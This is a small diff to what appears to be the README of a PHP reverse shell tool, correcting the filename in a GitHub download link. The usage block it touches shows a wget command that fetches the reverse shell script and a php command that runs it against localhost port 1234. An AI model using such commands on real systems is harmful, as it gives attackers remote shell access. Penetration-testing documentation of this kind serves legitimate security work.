@@ -35,6 +35,6 @@ or
 
 Download Smart Reverse Shell and open shell connection
 ```shell
-wget -O srs.php https://raw.githubusercontent.com/GramThanos/php-smart-reverse-shell/master/php-smart-reverse-shell.php
+wget -O srs.php https://raw.githubusercontent.com/GramThanos/php-smart-reverse-shell/master/srs.php
 php ./srs.php 127.0.0.1 1234
 ```
